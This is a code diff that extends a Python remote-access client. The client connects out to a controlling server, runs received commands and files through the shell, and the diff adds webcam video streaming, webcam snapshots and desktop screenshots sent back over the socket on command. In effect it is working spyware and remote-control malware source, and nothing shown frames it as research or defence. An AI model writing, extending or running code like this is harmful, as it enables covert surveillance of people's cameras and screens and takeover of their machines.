@@ -4,10 +4,12 @@ import os
 import time
 import struct
 import sys
+import cv2
+from PIL import ImageGrab
+import io
 
 MAX_RETRIES = 100
 RETRY_DELAY = 1
-
 BUFFER_SIZE = 4096
 
 def send_data(sock, data: bytes):
@@ -44,6 +46,79 @@ def receive_file(sock, filename):
         raise ConnectionError("Connection closed during file reception.")
     with open(filename, 'wb') as f:
         f.write(file_bytes)
+
+def stream_video(sock):
+    cam = cv2.VideoCapture(0)
+    time.sleep(2)  # Warm up the camera
+
+    if not cam.isOpened():
+        send_data(sock, b"[-] Unable to access the webcam.")
+        return
+
+    send_data(sock, b"[+] Starting video stream...")
+
+    try:
+        while True:
+            ret, frame = cam.read()
+            if not ret:
+                send_data(sock, b"[-] Failed to read frame from webcam.")
+                break
+
+            # Encode frame as JPEG
+            ret, jpeg = cv2.imencode('.jpg', frame)
+            if not ret:
+                send_data(sock, b"[-] Failed to encode frame.")
+                break
+
+            # Send frame bytes
+            send_data(sock, jpeg.tobytes())
+
+            # Check if server wants to stop streaming
+            sock.settimeout(0.1)
+            try:
+                cmd = receive_data(sock)
+                if cmd is not None and cmd.decode('utf-8').strip().lower() == "stopstream":
+                    send_data(sock, b"[*] Stopping video stream as requested.")
+                    break
+            except socket.timeout:
+                # No command received, continue streaming
+                pass
+            finally:
+                sock.settimeout(None)
+    finally:
+        cam.release()
+
+def take_webcam_snapshot(sock):
+    cam = cv2.VideoCapture(0)
+    time.sleep(2)  # Warm up the camera
+
+    if not cam.isOpened():
+        send_data(sock, b"[-] Unable to access the webcam for snapshot.")
+        return
+
+    ret, frame = cam.read()
+    cam.release()
+
+    if not ret:
+        send_data(sock, b"[-] Failed to capture snapshot.")
+        return
+
+    ret, jpeg = cv2.imencode('.jpg', frame)
+    if not ret:
+        send_data(sock, b"[-] Failed to encode snapshot.")
+        return
+
+    send_data(sock, jpeg.tobytes())
+
+def take_desktop_screenshot(sock):
+    try:
+        img = ImageGrab.grab()  # Capture full screen
+        with io.BytesIO() as buf:
+            img.save(buf, format='JPEG')
+            jpeg_bytes = buf.getvalue()
+        send_data(sock, jpeg_bytes)
+    except Exception as e:
+        send_data(sock, f"[-] Failed to take screenshot: {e}".encode('utf-8'))
 
 def connect_to_server(server_ip, server_port):
     attempt = 0
@@ -104,6 +179,15 @@ def connect_to_server(server_ip, server_port):
                         result = subprocess.run([filename], capture_output=True, text=True, shell=True)
                         output = result.stdout + result.stderr
                         send_data(sock, output.encode('utf-8'))
+
+                    elif command == "stream":
+                        stream_video(sock)
+
+                    elif command == "snapshot":
+                        take_webcam_snapshot(sock)
+
+                    elif command == "screenshot":
+                        take_desktop_screenshot(sock)
 
                     else:
                         result = subprocess.run(command, shell=True, capture_output=True, text=True)
